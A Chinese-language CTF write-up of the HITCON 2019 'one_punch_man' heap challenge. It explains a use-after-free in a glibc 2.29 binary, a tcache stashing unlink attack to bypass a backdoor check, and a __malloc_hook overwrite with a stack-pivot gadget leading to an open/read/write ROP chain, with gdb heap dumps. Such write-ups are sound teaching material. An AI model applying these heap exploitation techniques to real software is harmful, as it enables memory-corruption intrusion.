# 201 Hitcon-CTF one_punch_man

漏洞类型： `UAF` `Double Free`

利用方式： `Tcache Stashing Unlink Attack`

flag： `flag{this_is_a_test_flag}`

## Writeup

### 基本信息

开启了常见保护，题目环境为 glibc 2.29 ，使用 seccomp 开启了沙箱保护，只有白名单上的系统调用可以使用。

```bash
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master› 
╰─$ checksec ./one_punch
[*] '/home/wz/Desktop/CTF/xz_files/hitcon2019_one_punch_man/one_punch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master*› 
╰─$ seccomp-tools dump ./one_punch
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL

```

### 基本功能

Add 函数可以分配 `[0x80,0x400]` 大小的堆块，分配的函数为 `calloc` ，输入数据首先存储到栈上，之后再使用 `strncpy` 拷贝到 `bss` 上的数组里。

Delete 函数 `free` 堆块之后未清空，造成 `double free` 和 `UAF`

```c
void __fastcall Delete(__int64 a1, __int64 a2)
{
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  MyPuts("idx: ");
  v2 = read_int();
  if ( v2 > 2 )
    error("invalid", a2);
  free(*((void **)&unk_4040 + 2 * v2));
}
```
后门函数可以调用 `malloc` 分配 `0x217` 大小的堆块，但是要要满足 `*(_BYTE *)(qword_4030 + 0x20) > 6` ，我们在 `main` 函数里可以看到这里被初始化为 `heap_base+0x10` ，对于 glibc 2.29，这个位置对应存储的是 `tcache_perthread_struct` 的 `0x220` 大小的 `tcache_bin` 的数量，正常来说，如果我们想调用后门的功能，要让这个 `count` 为 7 ，然而这也就意味着 `0x217` 再分配和释放都同 `glibc 2.23` 一样，我们无法通过 `UAF` 改 chunk 的 `fd` 来达到任意地址写的目的，因此我们要通过别的方式修改这个值。
```c
__int64 __fastcall Magic(__int64 a1, __int64 a2)
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(_BYTE *)(qword_4030 + 0x20) <= 6 )
    error("gg", a2);
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err", a2);
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io", buf);
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
}
```
Edit 和 Show 函数分别可以对堆块内容进行编辑和输出。

### 利用思路

由于 glibc 2.29 中新增了对于 `unsorted bin` 链表完整性检查，这使得 `unsorted bin attack` 完全失效，我们的目标是往一个地址中写入 `large value` ，这种情况下就可以选择 `tcache stashing unlink attack`。

首先我们可以通过UAF来泄露 `heap` 和 `libc` 地址。具体方式是分配并释放多个chunk使其进入 `tcache` ，通过 `Show` 函数可以输出 `tcache bin` 的 `fd` 值来泄露堆地址。释放某个 `small bin size` 范围内的chunk七个，在第八次释放时会先把释放的堆块放入 `unsorted bin` 。通过 `Show` 函数可以泄露出 libc 地址。

我们首先通过 `UAF` 将 `__malloc_hook` 链入 `tcache` 备用。然后分配并释放六次 `0x100` 大小的chunk进入 `tcache` 。通过 `unsorted bin` 切割得到 `last remainer` 的方式得到两个大小为 `0x100` 的chunk。再分配一个超过 0x100 的块使其进入 `small bin` 。按照释放顺序我们称之为 bin1 和 bin2 。修改 `bin2->bk` 为 `(heap_base+0x2f)-0x10` ，调用 `calloc(0xf0)` 触发 `small bin` 放入 `tcache` 的处理逻辑，由于 `tcache` 中有 6 个块，因此循环处理只会进行一次，这样也避免了 fake_chunk 因 bk 处无可写地址作为下一个块进行 unlink 时 `bck->fd=bin` 带来的内存访问错误。最终改掉 `heap_base+0x30` 的值绕过检查。

### 利用步骤

下面在调用 calloc 前下断点，可以看到此时 `tcache[0x100]` 有 6 个堆块，small bin 的分配顺序为 `0x000055555555c460->0x55555555cc80->0x000055555555901f` ，在 `calloc(0xf0)` 调用后， `0x000055555555c460` 会被返回给用户， `0x55555555cc80` 被链入tcache，而由于没有多余位置，跳出循环， `0x000055555555901f` 不做处理。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x100 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](6): 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x220)   tcache_entry[32](1): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x55555555cc80
0x55555555cc80: 0x0000000000000000      0x0000000000000101
0x55555555cc90: 0x000055555555c460      0x000055555555901f
gdb-peda$ x/4gx 0x000055555555c460
0x55555555c460: 0x0000000000000000      0x0000000000000101
0x55555555c470: 0x00007ffff7fb4d90      0x000055555555cc80
gdb-peda$ x/4gx 0x00007ffff7fb4d90
0x7ffff7fb4d90 <main_arena+336>:        0x00007ffff7fb4d80      0x00007ffff7fb4d80                                                  
0x7ffff7fb4da0 <main_arena+352>:        0x000055555555cc80      0x000055555555c460
```
calloc 分配完成之后的结果和我们预期一致， `0x000055555555901f` 作为 `fake_chunk` 其 `fd` 也被改写为了 `libc` 地址
```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x700 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](7): 0x55555555cc90 --> 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x210)   tcache_entry[31](144): 0
(0x220)   tcache_entry[32](77): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x230)   tcache_entry[33](251): 0
(0x240)   tcache_entry[34](247): 0
(0x250)   tcache_entry[35](255): 0
(0x260)   tcache_entry[36](127): 0
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x000055555555901f+0x10
0x55555555902f: 0x00007ffff7fb4d90      0x0000000000000000
0x55555555903f: 0x0000000000000000      0x0000000000000000
```
由于沙箱保护，我们无法执行 `execve` 函数调用，只能通过 `open/read/write` 来读取 flag 。我们选择通过调用后门函数修改 `__malloc_hook` 为 `gadget(mov eax, esi ; add rsp, 0x48 ; ret)` ，以便 add 的时候将 `rsp` 改到可控的输入区域调用 `rop chains` 来 `orw` 读取 `flag` 。